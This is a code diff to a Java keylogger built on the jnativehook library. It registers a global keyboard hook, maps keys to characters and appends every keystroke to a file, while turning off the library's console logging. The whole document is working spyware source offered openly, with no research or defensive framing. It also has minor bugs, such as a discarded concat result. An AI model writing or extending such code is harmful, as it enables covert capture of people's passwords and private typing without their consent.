@@ -10,13 +10,17 @@ import org.jnativehook.keyboard.NativeKeyListener;
 public class KeyLogger implements NativeKeyListener {
 	
 	private String textEntered;
+	private FileHandler fileHandler;
 	
 	public KeyLogger() {
-		textEntered = "";
+		textEntered = new String();
+		fileHandler = FileHandler.getInstance();
 	}
 
     public static void main(String[] args) {
     	KeyLogger keyLogger = new KeyLogger();
+    	
+        keyLogger.createFile();
     	
         try {
             GlobalScreen.registerNativeHook();
@@ -31,31 +35,48 @@ public class KeyLogger implements NativeKeyListener {
         keyLogger.disableConsoleLogger();
     }
     
-    public void disableConsoleLogger() {
-    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
-        logger.setLevel(Level.OFF);
-        logger.setUseParentHandlers(false);
+    public void createFile() {
+    	fileHandler.createNewFile();
     }
 
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
 		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
+		String convertedKey = convertKey(keyPressed);
 		
+		textEntered.concat(convertedKey);
+		fileHandler.appendToFile(convertedKey);
+	}
+	
+	public String convertKey(String keyPressed){
 		switch(keyPressed) {
 			case "Space" :
 				keyPressed = " ";
 				break;
-			case "Shift" :
-				keyPressed = "";
-				break;
 			case "Period" :
 				keyPressed = ".";
 				break;
+			case "Comma" :
+				keyPressed = ",";
+				break;
+			case "Backspace" :
+				keyPressed = "";
+				break;
+			case "Shift" :
+				keyPressed = "";
+				break;
+			case " Ctrl " :
+				keyPressed = "";
+				break;
 		}
-
-		textEntered += keyPressed;
-		System.out.println(textEntered);
+		return keyPressed;
 	}
+	
+    public void disableConsoleLogger() {
+    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+        logger.setUseParentHandlers(false);
+    }
 
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}
